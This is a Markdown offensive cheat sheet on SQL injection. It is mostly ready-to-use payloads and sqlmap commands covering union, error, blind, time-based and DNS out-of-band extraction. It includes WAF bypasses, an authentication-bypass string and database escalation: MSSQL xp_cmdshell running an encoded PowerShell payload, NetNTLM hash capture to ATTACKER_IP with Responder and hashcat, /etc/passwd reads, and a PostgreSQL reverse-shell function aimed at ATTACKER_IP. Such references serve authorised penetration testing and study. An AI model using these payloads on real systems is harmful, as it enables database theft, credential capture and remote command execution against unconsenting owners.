# SQL Injection (SQLi)

> **Summary**: Inject malicious SQL statements into application queries via unsanitized user input.
> **Impact**: Data exfiltration, authentication bypass, data modification/deletion, remote code execution, full database compromise.
> **Typical Severity**: Critical

## Detection

### Indicators
- Application returns database error messages (syntax errors, type conversion errors)
- Different responses for `' AND 1=1--` vs `' AND 1=2--`
- Time delays when injecting sleep-based payloads
- Unusual data in HTTP responses after injecting UNION queries

### Automated Detection
```bash
# sqlmap from captured request
sqlmap -r request.txt -p <PARAMETER> --batch

# sqlmap against URL
sqlmap -u "http://<TARGET>/page?id=1" --batch --random-agent

# Burp Suite Active Scanner / SQLi-specific scan
```

### Manual Detection
```
# String-based detection
'
"
`
')
")
`)
'))
"))
`))

# Numeric detection
OR 1=1
OR 1=2
AND 1=1
AND 1=2

# Time-based detection
'; WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--
' || pg_sleep(5)--
```

## Exploitation

### Prerequisites
- User-controlled input reaches a SQL query without parameterization
- Ability to observe responses (inline) or infer data (blind)

### Injection Types

#### 1. Union-Based
Determine column count, then extract data via UNION SELECT.

```sql
-- Find column count
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY N-- -    -- increase until error

-- Find displayable columns
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 'a',NULL,NULL-- -

-- Extract data (MySQL example)
' UNION SELECT username,password,NULL FROM users-- -
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -
```

#### 2. Error-Based

```sql
-- PostgreSQL
' AND 1=CAST((SELECT version()) AS INT)--
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--
' AND 1=CAST((SELECT STRING_AGG(table_name,',') FROM information_schema.tables) AS INT)--
';SELECT CAST(CAST(QUERY_TO_XML('SELECT <QUERY>',TRUE,TRUE,'') AS TEXT) AS INT)--

-- MSSQL
' AND 1=CONVERT(INT,(SELECT @@version))--
'+AND+1=user_name(@@version)--

-- MySQL
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND extractvalue(1,concat(0x7e,(SELECT version())))--

-- Oracle
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))--
```

#### 3. Blind - Boolean-Based

```sql
' AND 1=1-- -    -- true condition (normal response)
' AND 1=2-- -    -- false condition (different response)

-- Extract data character by character
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96-- -
```

#### 4. Blind - Time-Based

| Database      | Payload                                                      |
| ------------- | ------------------------------------------------------------ |
| MSSQL         | `WAITFOR DELAY '0:0:10'`                                     |
| MySQL/MariaDB | `AND (SELECT SLEEP(10) FROM dual WHERE database() LIKE '%')` |
| PostgreSQL    | `\| (SELECT 1 FROM PG_SLEEP(10))`                            |
| Oracle        | `AND 1234=DBMS_PIPE.RECEIVE_MESSAGE('RaNdStR',10)`           |

#### 5. Out-of-Band (DNS Exfiltration)

**MSSQL**:
```sql
DECLARE @T VARCHAR(1024);SELECT @T=(SELECT <DATA>);
EXEC('master..xp_dirtree "\\'+@T+'.<BURP_COLLABORATOR>\\x"');

-- Alternative functions
-- master..xp_fileexist, master..xp_subdirs, fn_get_audit_file, fn_trace_gettable
```

**PostgreSQL**:
```sql
copy (SELECT '') to program 'nslookup <DATA>.<BURP_COLLABORATOR>'
```

**MySQL**:
```sql
SELECT LOAD_FILE(CONCAT('\\\\',(<QUERY>),'.<BURP_COLLABORATOR>\\a'));
```

**Oracle**:
```sql
SELECT UTL_HTTP.REQUEST('http://'||(SELECT user FROM dual)||'.<BURP_COLLABORATOR>/') FROM dual;
```

#### 6. Second-Order SQLi
Payload is stored in the database and executed in a different query context later.
```bash
# sqlmap second-order support
sqlmap -r login.txt -p username --second-url "http://<TARGET>/details.php"
sqlmap -r login.txt -p username --second-req details.txt
```

### Database-Specific Exploitation

#### MSSQL - RCE via xp_cmdshell
```sql
-- Check sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Enable xp_cmdshell
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -e <BASE64_PAYLOAD>';
```

#### MSSQL - NetNTLM Hash Capture
```sql
-- Trigger SMB auth to attacker (run Responder on attacker)
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share', 1, 1;
```
```bash
# Attacker side
sudo responder -I <INTERFACE>
hashcat -m 5600 '<CAPTURED_HASH>' /usr/share/wordlists/rockyou.txt
```

#### MSSQL - File Read
```sql
SELECT BulkColumn FROM OPENROWSET(BULK '<FILE_PATH>', SINGLE_CLOB) AS x
```

#### PostgreSQL - File Read/Write
```sql
-- Read with COPY
CREATE TABLE tmp(t TEXT); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp; DROP TABLE tmp;

-- Read with Large Objects
SELECT lo_import('/etc/passwd'); SELECT lo_get(<OID>);

-- Write with COPY
CREATE TABLE tmp(t TEXT); INSERT INTO tmp VALUES('<CONTENT>');
COPY tmp TO '/tmp/proof.txt'; DROP TABLE tmp;

-- RCE with COPY
CREATE TABLE tmp(t TEXT); COPY tmp FROM PROGRAM 'id'; SELECT * FROM tmp; DROP TABLE tmp;

-- RCE with Extensions
CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;
SELECT rev_shell('<ATTACKER_IP>', <PORT>);
```

## Bypasses

### WAF Bypass Techniques
```
-- Space bypass
/**/    instead of space
+       in URLs
%09     tab character
%0a     newline

-- Quote bypass
$$string$$          instead of 'string' (PostgreSQL)
CHAR(115,116,114)   instead of 'str'

-- Keyword bypass
SeLeCt              case variation
S%45LECT            URL encoding
SEL/**/ECT          inline comments
/*!SELECT*/         MySQL conditional comments

-- Equals bypass
LIKE instead of =
BETWEEN 1 AND 1

-- Comma bypass
OFFSET instead of LIMIT x,y
JOIN instead of comma in UNION
```

### UTF-8 Trick
Sites appending extra `'` can be bypassed with `\xc2` -- decoding of `\xc2'` (`\xc2\x27`) consumes the quote as a multi-byte sequence.

### sqlmap Tamper Scripts
```bash
sqlmap -u "<URL>" --tamper="between,randomcase,space2comment"

# Common tampers: between, randomcase, space2comment, charencode,
# equaltolike, greatest, apostrophemask, percentage
```

## Escalation
- **Data exfiltration** --> dump entire database
- **Authentication bypass** --> login as admin with `' OR 1=1-- -`
- **Privilege escalation** --> read credentials, access other databases
- **OS command execution** --> xp_cmdshell (MSSQL), COPY FROM PROGRAM (PostgreSQL)
- **File read/write** --> access server filesystem
- **Lateral movement** --> MSSQL linked servers, AD enumeration via `SUSER_SNAME()`

## Tools

| Tool | Usage |
|------|-------|
| [sqlmap](https://github.com/sqlmapproject/sqlmap) | `sqlmap -r req.txt -p <PARAM> --batch --risk=3 --level=5` |
| [Atlas](https://github.com/m4ll0k/Atlas) | sqlmap tamper suggestion tool |
| Burp Suite Intruder | Manual payload fuzzing and response comparison |
| [ghauri](https://github.com/r0oth3x49/ghauri) | Advanced SQL injection detection and exploitation |
| [jSQL Injection](https://github.com/ron190/jsql-injection) | Java-based automatic SQL injection tool |
| `psql` | `psql -h <HOST> -U <USER> <DB>` -- direct PostgreSQL interaction |

### sqlmap Quick Reference
```bash
# From Burp request file
sqlmap -r request.txt -p <PARAM> --batch

# GET parameter
sqlmap -u "http://<TARGET>/page?id=1" -p id

# POST data
sqlmap -u "http://<TARGET>/page" --data="user=admin&pass=test" --method=POST

# Cookie injection
sqlmap -u "http://<TARGET>/page" --cookie="session=*"

# Header injection
sqlmap -u "http://<TARGET>/page" --headers="X-Forwarded-For:127.0.0.1*"

# Specify technique (B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=OOB)
sqlmap -u "<URL>" --technique="BEU" --batch

# Database enumeration
sqlmap -u "<URL>" --dbs
sqlmap -u "<URL>" -D <DB> --tables
sqlmap -u "<URL>" -D <DB> -T <TABLE> --dump

# OS shell
sqlmap -u "<URL>" --os-shell
```

## References
- [sqlmap project](https://github.com/sqlmapproject/sqlmap)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [PortSwigger - SQL Injection](https://portswigger.net/web-security/sql-injection)

## See Also
- [NoSQL Injection](nosql.md)
- [Command Injection](command-injection.md)
